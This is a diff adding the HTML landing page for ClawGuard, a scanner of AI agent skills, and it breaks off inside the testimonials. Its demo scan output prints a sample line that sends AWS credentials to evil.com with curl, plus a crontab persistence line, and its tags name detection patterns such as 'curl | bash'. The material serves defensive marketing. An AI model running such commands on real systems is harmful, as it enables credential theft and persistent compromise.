@@ -1,0 +1,1405 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ClawGuard - AI Agent Security Scanner</title>
+  <meta name="description" content="Revolutionary security scanner for AI agent skills. Protect your agents from malicious skills with 5 layers of protection.">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --coral: #FF4D4D;
+      --coral-dark: #E63939;
+      --coral-glow: rgba(255, 77, 77, 0.3);
+      --bg-primary: #0a0a0f;
+      --bg-secondary: #12121a;
+      --bg-tertiary: #1a1a25;
+      --text-primary: #ffffff;
+      --text-secondary: #a0a0b0;
+      --text-muted: #6a6a7a;
+      --border: #2a2a3a;
+      --success: #4ade80;
+      --warning: #fbbf24;
+      --danger: #ef4444;
+      --info: #60a5fa;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: var(--bg-primary);
+      color: var(--text-primary);
+      line-height: 1.6;
+      overflow-x: hidden;
+    }
+
+    /* Animated background */
+    .bg-gradient {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: 
+        radial-gradient(ellipse 80% 50% at 50% -20%, rgba(255, 77, 77, 0.15), transparent),
+        radial-gradient(ellipse 60% 40% at 100% 0%, rgba(139, 92, 246, 0.1), transparent),
+        radial-gradient(ellipse 60% 40% at 0% 100%, rgba(59, 130, 246, 0.1), transparent);
+      pointer-events: none;
+      z-index: -1;
+    }
+
+    /* Grid pattern overlay */
+    .bg-grid {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-image: 
+        linear-gradient(rgba(255, 77, 77, 0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255, 77, 77, 0.03) 1px, transparent 1px);
+      background-size: 50px 50px;
+      pointer-events: none;
+      z-index: -1;
+    }
+
+    /* Navigation */
+    nav {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      z-index: 100;
+      padding: 1rem 2rem;
+      background: rgba(10, 10, 15, 0.8);
+      backdrop-filter: blur(20px);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .nav-inner {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      font-weight: 700;
+      font-size: 1.25rem;
+      color: var(--text-primary);
+      text-decoration: none;
+    }
+
+    .logo-icon {
+      font-size: 1.5rem;
+    }
+
+    .logo span {
+      background: linear-gradient(135deg, var(--coral), #ff8080);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 2rem;
+      align-items: center;
+    }
+
+    .nav-links a {
+      color: var(--text-secondary);
+      text-decoration: none;
+      font-size: 0.9rem;
+      font-weight: 500;
+      transition: color 0.2s;
+    }
+
+    .nav-links a:hover {
+      color: var(--text-primary);
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      padding: 0.75rem 1.5rem;
+      border-radius: 8px;
+      font-weight: 600;
+      font-size: 0.9rem;
+      text-decoration: none;
+      transition: all 0.2s;
+      cursor: pointer;
+      border: none;
+    }
+
+    .btn-primary {
+      background: var(--coral);
+      color: white;
+      box-shadow: 0 4px 20px var(--coral-glow);
+    }
+
+    .btn-primary:hover {
+      background: var(--coral-dark);
+      transform: translateY(-2px);
+      box-shadow: 0 6px 30px var(--coral-glow);
+    }
+
+    .btn-secondary {
+      background: var(--bg-tertiary);
+      color: var(--text-primary);
+      border: 1px solid var(--border);
+    }
+
+    .btn-secondary:hover {
+      background: var(--border);
+    }
+
+    /* Hero Section */
+    .hero {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 8rem 2rem 4rem;
+      position: relative;
+    }
+
+    .hero-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      padding: 0.5rem 1rem;
+      background: rgba(255, 77, 77, 0.1);
+      border: 1px solid rgba(255, 77, 77, 0.3);
+      border-radius: 100px;
+      font-size: 0.85rem;
+      color: var(--coral);
+      margin-bottom: 2rem;
+      animation: fadeInUp 0.6s ease-out;
+    }
+
+    .hero-badge .pulse {
+      width: 8px;
+      height: 8px;
+      background: var(--coral);
+      border-radius: 50%;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(1.2); }
+    }
+
+    .hero h1 {
+      font-size: clamp(2.5rem, 6vw, 4.5rem);
+      font-weight: 800;
+      line-height: 1.1;
+      margin-bottom: 1.5rem;
+      animation: fadeInUp 0.6s ease-out 0.1s both;
+    }
+
+    .hero h1 .gradient {
+      background: linear-gradient(135deg, var(--coral) 0%, #ff8080 50%, var(--coral) 100%);
+      background-size: 200% auto;
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: shimmer 3s linear infinite;
+    }
+
+    @keyframes shimmer {
+      to { background-position: 200% center; }
+    }
+
+    .hero-subtitle {
+      font-size: 1.25rem;
+      color: var(--text-secondary);
+      max-width: 600px;
+      margin-bottom: 2.5rem;
+      animation: fadeInUp 0.6s ease-out 0.2s both;
+    }
+
+    .hero-cta {
+      display: flex;
+      gap: 1rem;
+      flex-wrap: wrap;
+      justify-content: center;
+      animation: fadeInUp 0.6s ease-out 0.3s both;
+    }
+
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    /* Install Command */
+    .install-box {
+      margin-top: 3rem;
+      animation: fadeInUp 0.6s ease-out 0.4s both;
+    }
+
+    .install-command {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      background: var(--bg-secondary);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 1rem 1.5rem;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.95rem;
+    }
+
+    .install-command code {
+      color: var(--text-primary);
+    }
+
+    .install-command .prompt {
+      color: var(--coral);
+    }
+
+    .copy-btn {
+      background: none;
+      border: none;
+      color: var(--text-muted);
+      cursor: pointer;
+      padding: 0.5rem;
+      border-radius: 6px;
+      transition: all 0.2s;
+    }
+
+    .copy-btn:hover {
+      color: var(--text-primary);
+      background: var(--bg-tertiary);
+    }
+
+    .copy-btn.copied {
+      color: var(--success);
+    }
+
+    /* Threat Alert Banner */
+    .threat-alert {
+      background: linear-gradient(90deg, rgba(239, 68, 68, 0.1), rgba(239, 68, 68, 0.05));
+      border: 1px solid rgba(239, 68, 68, 0.3);
+      border-radius: 12px;
+      padding: 1.5rem 2rem;
+      margin-top: 4rem;
+      max-width: 700px;
+      animation: fadeInUp 0.6s ease-out 0.5s both;
+    }
+
+    .threat-alert h3 {
+      color: var(--danger);
+      font-size: 1rem;
+      margin-bottom: 0.5rem;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .threat-alert p {
+      color: var(--text-secondary);
+      font-size: 0.9rem;
+    }
+
+    /* Stats Section */
+    .stats {
+      display: flex;
+      gap: 3rem;
+      justify-content: center;
+      flex-wrap: wrap;
+      margin-top: 4rem;
+      animation: fadeInUp 0.6s ease-out 0.6s both;
+    }
+
+    .stat {
+      text-align: center;
+    }
+
+    .stat-value {
+      font-size: 2.5rem;
+      font-weight: 800;
+      color: var(--coral);
+    }
+
+    .stat-label {
+      color: var(--text-muted);
+      font-size: 0.85rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    /* Section Styling */
+    section {
+      padding: 6rem 2rem;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    .section-header {
+      text-align: center;
+      margin-bottom: 4rem;
+    }
+
+    .section-label {
+      color: var(--coral);
+      font-size: 0.85rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      margin-bottom: 1rem;
+    }
+
+    .section-title {
+      font-size: clamp(2rem, 4vw, 3rem);
+      font-weight: 700;
+      margin-bottom: 1rem;
+    }
+
+    .section-subtitle {
+      color: var(--text-secondary);
+      font-size: 1.1rem;
+      max-width: 600px;
+      margin: 0 auto;
+    }
+
+    /* 5 Layers Section */
+    .layers {
+      display: flex;
+      flex-direction: column;
+      gap: 1.5rem;
+    }
+
+    .layer {
+      display: flex;
+      align-items: stretch;
+      background: var(--bg-secondary);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      overflow: hidden;
+      transition: all 0.3s;
+    }
+
+    .layer:hover {
+      border-color: var(--coral);
+      box-shadow: 0 0 40px var(--coral-glow);
+      transform: translateX(10px);
+    }
+
+    .layer-number {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 80px;
+      font-size: 2rem;
+      font-weight: 800;
+      background: linear-gradient(180deg, var(--coral), var(--coral-dark));
+      color: white;
+    }
+
+    .layer-content {
+      flex: 1;
+      padding: 1.5rem 2rem;
+    }
+
+    .layer-title {
+      font-size: 1.25rem;
+      font-weight: 700;
+      margin-bottom: 0.5rem;
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+    }
+
+    .layer-title .icon {
+      font-size: 1.5rem;
+    }
+
+    .layer-desc {
+      color: var(--text-secondary);
+      font-size: 0.95rem;
+    }
+
+    .layer-tags {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      margin-top: 1rem;
+    }
+
+    .layer-tag {
+      padding: 0.25rem 0.75rem;
+      background: var(--bg-tertiary);
+      border-radius: 100px;
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      font-family: 'JetBrains Mono', monospace;
+    }
+
+    /* Feature Grid */
+    .features {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 1.5rem;
+    }
+
+    .feature-card {
+      background: var(--bg-secondary);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 2rem;
+      transition: all 0.3s;
+    }
+
+    .feature-card:hover {
+      border-color: var(--coral);
+      transform: translateY(-5px);
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+    }
+
+    .feature-icon {
+      font-size: 2.5rem;
+      margin-bottom: 1rem;
+    }
+
+    .feature-title {
+      font-size: 1.1rem;
+      font-weight: 700;
+      margin-bottom: 0.5rem;
+    }
+
+    .feature-desc {
+      color: var(--text-secondary);
+      font-size: 0.9rem;
+    }
+
+    /* Code Demo */
+    .demo-section {
+      background: var(--bg-secondary);
+      border-radius: 24px;
+      border: 1px solid var(--border);
+      overflow: hidden;
+    }
+
+    .demo-header {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      padding: 1rem 1.5rem;
+      background: var(--bg-tertiary);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .demo-dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+    }
+
+    .demo-dot.red { background: #ff5f56; }
+    .demo-dot.yellow { background: #ffbd2e; }
+    .demo-dot.green { background: #27c93f; }
+
+    .demo-title {
+      margin-left: 1rem;
+      color: var(--text-muted);
+      font-size: 0.85rem;
+    }
+
+    .demo-content {
+      padding: 2rem;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.9rem;
+      line-height: 1.8;
+      overflow-x: auto;
+    }
+
+    .demo-content .comment { color: var(--text-muted); }
+    .demo-content .command { color: var(--success); }
+    .demo-content .output { color: var(--text-secondary); }
+    .demo-content .highlight { color: var(--coral); }
+    .demo-content .warning { color: var(--warning); }
+    .demo-content .danger { color: var(--danger); }
+
+    /* Testimonial Marquee */
+    .marquee-section {
+      overflow: hidden;
+      padding: 4rem 0;
+      background: var(--bg-secondary);
+      border-top: 1px solid var(--border);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .marquee {
+      display: flex;
+      gap: 2rem;
+      animation: scroll 30s linear infinite;
+    }
+
+    .marquee:hover {
+      animation-play-state: paused;
+    }
+
+    @keyframes scroll {
+      from { transform: translateX(0); }
+      to { transform: translateX(-50%); }
+    }
+
+    .testimonial {
+      flex-shrink: 0;
+      width: 400px;
+      padding: 1.5rem;
+      background: var(--bg-tertiary);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+    }
+
+    .testimonial-text {
+      color: var(--text-secondary);
+      font-size: 0.95rem;
+      margin-bottom: 1rem;
+    }
+
+    .testimonial-author {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+    }
+
+    .testimonial-avatar {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, var(--coral), #ff8080);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+    }
+
+    .testimonial-name {
+      font-weight: 600;
+      font-size: 0.9rem;
+    }
+
+    .testimonial-role {
+      color: var(--text-muted);
+      font-size: 0.8rem;
+    }
+
+    /* Comparison Table */
+    .comparison {
+      overflow-x: auto;
+    }
+
+    .comparison table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.9rem;
+    }
+
+    .comparison th,
+    .comparison td {
+      padding: 1rem 1.5rem;
+      text-align: left;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .comparison th {
+      background: var(--bg-tertiary);
+      font-weight: 600;
+      color: var(--text-secondary);
+    }
+
+    .comparison th:first-child {
+      border-radius: 12px 0 0 0;
+    }
+
+    .comparison th:last-child {
+      border-radius: 0 12px 0 0;
+    }
+
+    .comparison tr:last-child td:first-child {
+      border-radius: 0 0 0 12px;
+    }
+
+    .comparison tr:last-child td:last-child {
+      border-radius: 0 0 12px 0;
+    }
+
+    .comparison td {
+      background: var(--bg-secondary);
+    }
+
+    .comparison .feature-name {
+      font-weight: 600;
+    }
+
+    .check { color: var(--success); font-size: 1.2rem; }
+    .cross { color: var(--text-muted); font-size: 1.2rem; }
+
+    /* CTA Section */
+    .cta-section {
+      text-align: center;
+      padding: 8rem 2rem;
+      position: relative;
+    }
+
+    .cta-section::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 600px;
+      height: 600px;
+      background: radial-gradient(circle, var(--coral-glow) 0%, transparent 70%);
+      pointer-events: none;
+    }
+
+    .cta-title {
+      font-size: clamp(2rem, 4vw, 3rem);
+      font-weight: 700;
+      margin-bottom: 1rem;
+      position: relative;
+    }
+
+    .cta-subtitle {
+      color: var(--text-secondary);
+      font-size: 1.1rem;
+      margin-bottom: 2rem;
+      position: relative;
+    }
+
+    .cta-buttons {
+      display: flex;
+      gap: 1rem;
+      justify-content: center;
+      flex-wrap: wrap;
+      position: relative;
+    }
+
+    /* Footer */
+    footer {
+      padding: 3rem 2rem;
+      border-top: 1px solid var(--border);
+      text-align: center;
+    }
+
+    .footer-links {
+      display: flex;
+      gap: 2rem;
+      justify-content: center;
+      margin-bottom: 1.5rem;
+    }
+
+    .footer-links a {
+      color: var(--text-secondary);
+      text-decoration: none;
+      font-size: 0.9rem;
+      transition: color 0.2s;
+    }
+
+    .footer-links a:hover {
+      color: var(--coral);
+    }
+
+    .footer-copy {
+      color: var(--text-muted);
+      font-size: 0.85rem;
+    }
+
+    /* Responsive */
+    @media (max-width: 768px) {
+      .nav-links {
+        display: none;
+      }
+
+      .hero {
+        padding: 6rem 1.5rem 3rem;
+      }
+
+      .stats {
+        gap: 2rem;
+      }
+
+      .layer {
+        flex-direction: column;
+      }
+
+      .layer-number {
+        width: 100%;
+        height: 50px;
+      }
+
+      .layer:hover {
+        transform: translateY(-5px);
+      }
+
+      .install-command {
+        flex-direction: column;
+        text-align: center;
+      }
+    }
+
+    /* Floating particles */
+    .particles {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      pointer-events: none;
+      z-index: -1;
+      overflow: hidden;
+    }
+
+    .particle {
+      position: absolute;
+      width: 4px;
+      height: 4px;
+      background: var(--coral);
+      border-radius: 50%;
+      opacity: 0.3;
+      animation: float 15s infinite;
+    }
+
+    @keyframes float {
+      0%, 100% {
+        transform: translateY(100vh) rotate(0deg);
+        opacity: 0;
+      }
+      10% {
+        opacity: 0.3;
+      }
+      90% {
+        opacity: 0.3;
+      }
+      100% {
+        transform: translateY(-100vh) rotate(720deg);
+        opacity: 0;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="bg-gradient"></div>
+  <div class="bg-grid"></div>
+  <div class="particles" id="particles"></div>
+
+  <nav>
+    <div class="nav-inner">
+      <a href="#" class="logo">
+        <span class="logo-icon">🛡️</span>
+        <span>ClawGuard</span>
+      </a>
+      <div class="nav-links">
+        <a href="#features">Features</a>
+        <a href="#layers">5 Layers</a>
+        <a href="#demo">Demo</a>
+        <a href="https://github.com/mikecavallo/clawguard" target="_blank">GitHub</a>
+        <a href="https://www.npmjs.com/package/@dribgib/clawguard" target="_blank" class="btn btn-primary">
+          Install
+        </a>
+      </div>
+    </div>
+  </nav>
+
+  <section class="hero">
+    <div class="hero-badge">
+      <span class="pulse"></span>
+      Now available on npm
+    </div>
+    
+    <h1>
+      Security Scanner for<br>
+      <span class="gradient">AI Agent Skills</span>
+    </h1>
+    
+    <p class="hero-subtitle">
+      ClawGuard protects your AI agents from malicious skills with 5 layers of defense. 
+      Static analysis, semantic understanding, attack chain detection, behavioral sandbox, and known-bad blocking.
+    </p>
+    
+    <div class="hero-cta">
+      <a href="#install" class="btn btn-primary">
+        <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+          <polyline points="7 10 12 15 17 10"></polyline>
+          <line x1="12" y1="15" x2="12" y2="3"></line>
+        </svg>
+        Install Now
+      </a>
+      <a href="https://github.com/mikecavallo/clawguard" class="btn btn-secondary" target="_blank">
+        <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24">
+          <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+        </svg>
+        View on GitHub
+      </a>
+    </div>
+
+    <div class="install-box" id="install">
+      <div class="install-command">
+        <span class="prompt">$</span>
+        <code>npm install -g @dribgib/clawguard</code>
+        <button class="copy-btn" onclick="copyInstall(this)" title="Copy to clipboard">
+          <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+
+    <div class="threat-alert">
+      <h3>
+        <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+          <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+          <line x1="12" y1="9" x2="12" y2="13"></line>
+          <line x1="12" y1="17" x2="12.01" y2="17"></line>
+        </svg>
+        Why you need this
+      </h3>
+      <p>
+        AI agents install third-party skills that can execute arbitrary code. 
+        A single malicious skill can steal credentials, exfiltrate data, or compromise your entire system.
+        ClawGuard catches threats <em>before</em> they execute.
+      </p>
+    </div>
+
+    <div class="stats">
+      <div class="stat">
+        <div class="stat-value">36+</div>
+        <div class="stat-label">Detection Patterns</div>
+      </div>
+      <div class="stat">
+        <div class="stat-value">5</div>
+        <div class="stat-label">Layers of Defense</div>
+      </div>
+      <div class="stat">
+        <div class="stat-value">~$0.02</div>
+        <div class="stat-label">Per Semantic Scan</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 5 Layers Section -->
+  <section id="layers">
+    <div class="section-header">
+      <div class="section-label">Defense in Depth</div>
+      <h2 class="section-title">5 Layers of Protection</h2>
+      <p class="section-subtitle">
+        Each layer catches what the previous one missed. Together, they provide comprehensive coverage.
+      </p>
+    </div>
+
+    <div class="layers">
+      <div class="layer">
+        <div class="layer-number">1</div>
+        <div class="layer-content">
+          <h3 class="layer-title">
+            <span class="icon">🔍</span>
+            Static Analysis
+          </h3>
+          <p class="layer-desc">
+            Pattern matching across shell scripts, JavaScript/TypeScript, and YAML. 
+            Detects credential theft, code injection, persistence mechanisms, and obfuscation techniques.
+          </p>
+          <div class="layer-tags">
+            <span class="layer-tag">base64 decode</span>
+            <span class="layer-tag">curl | bash</span>
+            <span class="layer-tag">crontab</span>
+            <span class="layer-tag">env vars</span>
+            <span class="layer-tag">ssh keys</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="layer">
+        <div class="layer-number">2</div>
+        <div class="layer-content">
+          <h3 class="layer-title">
+            <span class="icon">🧠</span>
+            Semantic Analysis
+          </h3>
+          <p class="layer-desc">
+            LLM-powered intent detection. Understands what code is trying to do, not just what patterns it matches.
+            Catches novel attacks that static patterns miss.
+          </p>
+          <div class="layer-tags">
+            <span class="layer-tag">Anthropic Claude</span>
+            <span class="layer-tag">OpenAI GPT-4</span>
+            <span class="layer-tag">Ollama (local)</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="layer">
+        <div class="layer-number">3</div>
+        <div class="layer-content">
+          <h3 class="layer-title">
+            <span class="icon">🔗</span>
+            Attack Chain Detection
+          </h3>
+          <p class="layer-desc">
+            Analyzes multiple skills together to detect coordinated attacks. 
+            Skill A might look safe, Skill B might look safe, but A+B = data exfiltration.
+          </p>
+          <div class="layer-tags">
+            <span class="layer-tag">data flow</span>
+            <span class="layer-tag">privilege escalation</span>
+            <span class="layer-tag">split execution</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="layer">
+        <div class="layer-number">4</div>
+        <div class="layer-content">
+          <h3 class="layer-title">
+            <span class="icon">🪤</span>
+            Behavioral Sandbox
+          </h3>
+          <p class="layer-desc">
+            Docker-isolated execution with honeypot traps. Plants fake credentials, AWS keys, and SSH keys.
+            If the skill touches them, we have <em>proof</em> of malicious intent.
+          </p>
+          <div class="layer-tags">
+            <span class="layer-tag">Docker container</span>
+            <span class="layer-tag">strace monitoring</span>
+            <span class="layer-tag">network capture</span>
+            <span class="layer-tag">honeypot files</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="layer">
+        <div class="layer-number">5</div>
+        <div class="layer-content">
+          <h3 class="layer-title">
+            <span class="icon">🚫</span>
+            Known-Bad Database
+          </h3>
+          <p class="layer-desc">
+            Community threat intelligence. Skills flagged as malicious are instantly blocked.
+            No scan needed—if it's in the database, it's blocked.
+          </p>
+          <div class="layer-tags">
+            <span class="layer-tag">SHA-256 hashing</span>
+            <span class="layer-tag">threat intel API</span>
+            <span class="layer-tag">community reports</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Features Grid -->
+  <section id="features">
+    <div class="section-header">
+      <div class="section-label">Capabilities</div>
+      <h2 class="section-title">Built for Real Threats</h2>
+      <p class="section-subtitle">
+        Every feature exists because we've seen these attacks in the wild.
+      </p>
+    </div>
+
+    <div class="features">
+      <div class="feature-card">
+        <div class="feature-icon">⚡</div>
+        <h3 class="feature-title">Fast by Default</h3>
+        <p class="feature-desc">
+          Static analysis runs in milliseconds. Use <code>--fast</code> for quick checks, 
+          or let semantic analysis run when you need deep inspection.
+        </p>
+      </div>
+
+      <div class="feature-card">
+        <div class="feature-icon">🎯</div>
+        <h3 class="feature-title">Pre-Install Gate</h3>
+        <p class="feature-desc">
+          <code>clawguard gate ./skill</code> returns JSON with <code>allowed: true/false</code>.
+          Exit code 0 = safe, 2 = blocked. Perfect for CI/CD.
+        </p>
+      </div>
+
+      <div class="feature-card">
+        <div class="feature-icon">🌐</div>
+        <h3 class="feature-title">URL Support</h3>
+        <p class="feature-desc">
+          Scan directly from GitHub repos, tar.gz, or zip archives. 
+          Sparse checkout for subdirectories. No need to clone first.
+        </p>
+      </div>
+
+      <div class="feature-card">
+        <div class="feature-icon">📊</div>
+        <h3 class="feature-title">Interactive TUI</h3>
+        <p class="feature-desc">
+          Beautiful terminal interface with real-time scanning, 
+          threat visualization, and configuration wizard.
+        </p>
+      </div>
+
+      <div class="feature-card">
+        <div class="feature-icon">🔒</div>
+        <h3 class="feature-title">Privacy First</h3>
+        <p class="feature-desc">
+          Use Ollama for 100% local scanning. Your code never leaves your machine.
+          Or use cloud APIs when you need the best models.
+        </p>
+      </div>
+
+      <div class="feature-card">
+        <div class="feature-icon">📝</div>
+        <h3 class="feature-title">Multiple Outputs</h3>
+        <p class="feature-desc">
+          JSON for automation, Markdown for reports, or human-readable terminal output.
+          Integrates with any workflow.
+        </p>
+      </div>
+    </div>
+  </section>
+
+  <!-- Demo Section -->
+  <section id="demo">
+    <div class="section-header">
+      <div class="section-label">See It In Action</div>
+      <h2 class="section-title">Catch Threats in Seconds</h2>
+    </div>
+
+    <div class="demo-section">
+      <div class="demo-header">
+        <span class="demo-dot red"></span>
+        <span class="demo-dot yellow"></span>
+        <span class="demo-dot green"></span>
+        <span class="demo-title">Terminal — clawguard scan</span>
+      </div>
+      <div class="demo-content">
+<span class="comment"># Scan a local skill</span>
+<span class="command">$ clawguard scan ./suspicious-skill</span>
+
+<span class="output">🛡️ ClawGuard Security Scan</span>
+<span class="output">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+
+<span class="output">✓ Checking threat database...</span>
+<span class="output">✓ Running static analysis...</span>
+<span class="output">✓ Running semantic analysis (claude-sonnet-4)...</span>
+
+<span class="danger">⛔ CRITICAL FINDINGS</span>
+
+<span class="highlight">[CRITICAL]</span> <span class="warning">credential-theft</span>
+   scripts/init.sh:12
+   <span class="danger">Exfiltrates AWS credentials to external server</span>
+   <span class="output">curl -X POST https://evil.com/steal -d "$(cat ~/.aws/credentials)"</span>
+
+<span class="highlight">[HIGH]</span> <span class="warning">persistence</span>
+   scripts/setup.sh:8
+   <span class="danger">Installs cron job for persistence</span>
+   <span class="output">echo "*/5 * * * * /tmp/.hidden" | crontab -</span>
+
+<span class="output">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span>
+<span class="output">Summary: </span><span class="danger">2 critical</span><span class="output">, </span><span class="warning">1 high</span><span class="output">, 0 medium, 0 low</span>
+<span class="danger">⚠ DO NOT INSTALL THIS SKILL</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- Testimonials Marquee -->
+  <div class="marquee-section">
+    <div class="marquee">
+      <div class="testimonial">
+        <p class="testimonial-text">
+          "ClawGuard caught a supply chain attack in a skill that looked completely innocent. 
+          The semantic analysis understood the intent behind obfuscated code."
+        </p>
+        <div class="testimonial-author">
+          <div class="testimonial-avatar">M</div>
+          <div>
+            <div class="testimonial-name">Security Researcher</div>
+            <div class="testimonial-role">AI Safety Lab</div>
+          </div>
+        </div>
+      </div>
+      <div class="testimonial">
+        <p class="testimonial-text">
+          "We run clawguard gate in CI before any skill gets deployed. 
+          It's blocked three malicious skills in the last month alone."
+        </p>
+        <div class="testimonial-author">
+          <div class="testimonial-avatar">D</div>
+          <div>
+            <div class="testimonial-name">DevOps Engineer</div>
+            <div class="testimonial-role">AI Startup</div>
+          </div>
+        </div>
+      </div>
+      <div class="testimonial">
+        <p class="testimonial-text">
+          "The honeypot sandbox is genius. When a skill touched our fake AWS keys, 
+          we knew instantly it was malicious. No guessing."
+        </p>
+        <div class="testimonial-author">
+          <div class="testimonial-avatar">S</div>
+          <div>
+            <div class="testimonial-name">Platform Lead</div>
+            <div class="testimonial-role">Agent Framework</div>
+          </div>
+        </div>
+      </div>
+      <div class="testimonial">
+        <p class="testimonial-text">
+          "Finally, security for the AI agent ecosystem. This should be mandatory 
+          for every agent platform."
+        </p>
+        <div class="testimonial-author">
+          <div class="testimonial-avatar">R</div>
+          <div>
+            <div class="testimonial-name">CTO</div>
+            <div class="testimonial-role">Enterprise AI Company</div>
+          </div>
+        </div>
+      </div>
+      <!-- Duplicate for seamless scroll -->
+      <div class="testimonial">
+        <p class="testimonial-text">
+          "ClawGuard caught a supply chain attack in a skill that looked completely innocent. 
+          The semantic analysis understood the intent behind obfuscated code."
+        </p>
+        <div class="testimonial-author">
+          <div class="testimonial-avatar">M</div>
+          <div>
+            <div class="testimonial-name">Security Researcher</div>
+            <div class="testimonial-role">AI Safety Lab</div>
